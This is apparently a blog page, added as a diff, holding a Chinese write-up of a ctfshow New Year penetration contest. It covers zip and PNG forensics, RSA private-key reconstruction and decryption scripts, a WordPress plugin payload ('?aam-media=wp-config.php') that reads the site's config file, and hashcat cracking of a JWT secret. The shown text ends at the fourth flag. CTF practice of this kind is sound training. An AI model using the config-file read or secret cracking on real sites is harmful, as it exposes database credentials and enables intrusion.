@@ -1,0 +1,427 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2025元旦渗透赛复现-ctfshow | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2025ctfshow元旦渗透赛第一章flag1-压缩包压缩包密码爆破  flag2-图片-密码压缩包里面有个图片 PNG 文件的尾部标识符 49 45 4E 44 AE 42 60 82  提取出后边多余的文件base64解密👇出来个这个 1234567if __name__ &#x3D;&#x3D; &#x27;__main__&#x27;:    try:        import secretMessag">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025元旦渗透赛复现-ctfshow">
+<meta property="og:url" content="http://example.com/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/index.html">
+<meta property="og:site_name" content="DDL&#39;S BLOG">
+<meta property="og:description" content="2025ctfshow元旦渗透赛第一章flag1-压缩包压缩包密码爆破  flag2-图片-密码压缩包里面有个图片 PNG 文件的尾部标识符 49 45 4E 44 AE 42 60 82  提取出后边多余的文件base64解密👇出来个这个 1234567if __name__ &#x3D;&#x3D; &#x27;__main__&#x27;:    try:        import secretMessag">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2025-01-16T08:51:44.000Z">
+<meta property="article:modified_time" content="2025-01-16T08:52:57.677Z">
+<meta property="article:author" content="DDL">
+<meta property="article:tag" content="5wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2025元旦渗透赛复现-ctfshow',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">2025元旦渗透赛复现-ctfshow</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2025元旦渗透赛复现-ctfshow</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-01-16T08:51:44.000Z" title="Created 2025-01-16 16:51:44">2025-01-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-01-16T08:52:57.677Z" title="Updated 2025-01-16 16:52:57">2025-01-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>12mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="2025ctfshow元旦渗透赛"><a href="#2025ctfshow元旦渗透赛" class="headerlink" title="2025ctfshow元旦渗透赛"></a>2025ctfshow元旦渗透赛</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="flag1-压缩包"><a href="#flag1-压缩包" class="headerlink" title="flag1-压缩包"></a>flag1-压缩包</h3><p>压缩包密码爆破</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250112184336653.png?raw=true" alt="image-20250112184336653"></p>
+<h3 id="flag2-图片-密码"><a href="#flag2-图片-密码" class="headerlink" title="flag2-图片-密码"></a>flag2-图片-密码</h3><p>压缩包里面有个图片</p>
+<p>PNG 文件的尾部标识符</p>
+<p>49 45 4E 44 AE 42 60 82</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250112184756187.png?raw=true" alt="image-20250112184756187"></p>
+<p>提取出后边多余的文件base64解密👇出来个这个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    try:</span><br><span class="line">        import secretMessageResponse</span><br><span class="line">    except ImportError:</span><br><span class="line">        import pip</span><br><span class="line">        pip.main([&#x27;install&#x27;, &#x27;secretMessageResponse&#x27;])</span><br><span class="line">        from secretMessageResponse import printMessage</span><br></pre></td></tr></table></figure>
+
+<p>拿python运行一下没出来一堆数据</p>
+<p>去找库👇</p>
+<p>pip show secretMessageResponse</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250112190033665.png?raw=true" alt="image-20250112190033665"></p>
+<h4 id="crypto环境问题"><a href="#crypto环境问题" class="headerlink" title="crypto环境问题"></a>crypto环境问题</h4><p>from Crypto.PublicKey import RSA ModuleNotFoundError: No module named ‘Crypto’<br>解决方法：<br>（1）安装pycryptodome库 ： pip install pycryptodome<br>如果site-packages中存在crypto、pycrypto，在pip之前，需要pip uninstall crypto、pip uninstall pycrypto，否则无法安装成功。<br>（2）安装完成后将site-packages中crypto文件夹中的首字母c改为改为大写的C</p>
+<h3 id="求私钥"><a href="#求私钥" class="headerlink" title="求私钥"></a>求私钥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line">p = 31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span><br><span class="line">q = 19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span><br><span class="line">n = 633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span><br><span class="line">e = 0x10001</span><br><span class="line"></span><br><span class="line"># 计算其他相关参数</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = pow(e, -1, phi)</span><br><span class="line"></span><br><span class="line"># 生成私钥</span><br><span class="line">key = RSA.construct((n, e, d, p, q))</span><br><span class="line">private_key = key.export_key()</span><br><span class="line">print(private_key.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>求公钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line"></span><br><span class="line"># 提供的PEM格式公钥</span><br><span class="line">pem_key = b&quot;&quot;&quot;</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmziayo9Tddo1FYdrtOsw</span><br><span class="line">yjLYJ5frYKEwm4rQTsKU8UcdnnDRgms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZw</span><br><span class="line">BUqbgT5x+qUmUaVMll9FOT7ZJ05w8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63</span><br><span class="line">TDbXkJrv1fGl2rHpPwp5OPCUeCB3nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhsz</span><br><span class="line">dg+NhoBDUpxoVN5lzSKr2TMOLFLZaQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdi</span><br><span class="line">UTbk/tynpt+JFrDA8vL5/TOmuxgumqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMK</span><br><span class="line">gxNxuEKM5bMTESBK9A7Q2Kj3eNp0Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ</span><br><span class="line">3j/xhdhVCNVaXZF64V/YVpvC9Cq29F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7y</span><br><span class="line">pZoWmdXeaLIO+I3kP48BBSmue4nidJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t</span><br><span class="line">5tvayJ31zRQNT2ALAFeCDozVWELHTnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJ</span><br><span class="line">OFkBpWIX0aywMIh1woEAawUs3RM2pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFt</span><br><span class="line">zWn8oPZfzL346at5DDIwD2kCAwEAAQ==</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># 从PEM格式公钥中加载公钥</span><br><span class="line">public_key = serialization.load_pem_public_key(</span><br><span class="line">    pem_key,</span><br><span class="line">    backend=default_backend()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 提取模数(n)和公钥指数(e)</span><br><span class="line">n = public_key.public_numbers().n</span><br><span class="line">e = public_key.public_numbers().e</span><br><span class="line"></span><br><span class="line">print(&quot;模数(n):&quot;, n)</span><br><span class="line">print(&quot;公钥指数(e):&quot;, e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>解密脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import padding</span><br><span class="line">from cryptography.hazmat.primitives import hashes</span><br><span class="line"></span><br><span class="line">message = &#123;</span><br><span class="line">    &quot;inputMessage_20241216&quot; :&#x27;&#x27;&#x27;gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=&#x27;&#x27;&#x27;,</span><br><span class="line">    &quot;inputMessage_20240411&quot; : &#x27;&#x27;&#x27;Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=&#x27;&#x27;&#x27;,</span><br><span class="line">    &quot;inputMessage_20240305&quot; : &#x27;&#x27;&#x27;ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=&#x27;&#x27;&#x27;,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import base64</span><br><span class="line">p = 31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span><br><span class="line"></span><br><span class="line">q = 19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = 0x10001</span><br><span class="line">d = inverse(e,(p - 1) * (q - 1))</span><br><span class="line">pub = RSA.construct((n,e,d,p,q))</span><br><span class="line"></span><br><span class="line">with open(&#x27;out.pem&#x27;,&#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(pub.exportKey(&#x27;PEM&#x27;))</span><br><span class="line">with open(&#x27;out.pem&#x27;,&#x27;rb&#x27;) as f:</span><br><span class="line">    pri_key = f.read()</span><br><span class="line"># print(pri_key)</span><br><span class="line"></span><br><span class="line">private_key = serialization.load_pem_private_key(pri_key,password=None,backend=default_backend())</span><br><span class="line"></span><br><span class="line">for key, value in message.items():</span><br><span class="line">    encrypted = base64.b64decode(value)</span><br><span class="line">    message = private_key.decrypt(</span><br><span class="line">        encrypted,</span><br><span class="line">        padding.OAEP(</span><br><span class="line">            mgf=padding.MGF1(algorithm=hashes.SHA256()),</span><br><span class="line">            algorithm=hashes.SHA256(),</span><br><span class="line">            label=None</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    print(base64.b64decode(message).decode())</span><br></pre></td></tr></table></figure>
+
+<p>得出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Park:</span><br><span class="line">你的行动已经暴露，24小时内迅速撤离，销毁所有资料，将现有资料统一上传到【任务中心】</span><br><span class="line">发送人：Dylan</span><br><span class="line">Park:</span><br><span class="line">总部已经为你安排新的身份，请务必在3日内抵台，你的新身份是新竹县动物保护防疫所网络安全顾问，【任务中心】账号密码和你任职单位网站的数据库用户名密码一致，请尽快修改</span><br><span class="line">发送人：Dylan</span><br><span class="line">Park:</span><br><span class="line">【任务中心】网址已变更为 https://task.ctfer.com ，请注意修改浏览器地址栏中的链接</span><br><span class="line">发送人：Dylan</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag3-wp漏洞-基础账户"><a href="#flag3-wp漏洞-基础账户" class="headerlink" title="flag3-wp漏洞+基础账户"></a>flag3-wp漏洞+基础账户</h3><p>从这突然好玩了起来</p>
+<p>根据2的提示去获得账号密码</p>
+<p>根据对应网进数据库查，网页源代码是wordpress的，</p>
+<p>扫一扫查一查</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://wpscan.com/vulnerability/dfe62ff5-956c-4403-b3fd-55677628036b/</span><br></pre></td></tr></table></figure>
+
+<p>漏洞验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?aam-media=wp-config.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="flag4-jwt伪造-第二个账户"><a href="#flag4-jwt伪造-第二个账户" class="headerlink" title="flag4-jwt伪造+第二个账户"></a>flag4-jwt伪造+第二个账户</h3><p><img src="https://github.com/DDL08/images/blob/img/img/image-20250112204506758.png?raw=true" alt="image-20250112204506758"></p>
+<p>查看电话号码的地方可以抓包，根据提示是jwt，key在火堆里面</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250112204637315.png?raw=true" alt="image-20250112204637315"></p>
+<p>4a4f7d6e8b5 ？0c7f</p>
+<p>4a4f7d6e8b5e3a0c7f</p>
+<p>爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 16500 hash.txt --custom-charset1=?l?d 4a4f7d6e8b5?1?1?10c7f</span><br><span class="line"></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoc2luY2h1Z193cDEiLCJleHAiOjE3MzY3NzIyNTV9._fw255qGHn4l9BtB6Uw2AifVgb9Z5xd7Grl41Q7S7LU</span><br></pre></td></tr></table></figure>
+
+<p>出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;117447685307&#125;</span><br></pre></td></tr></table></figure>
+
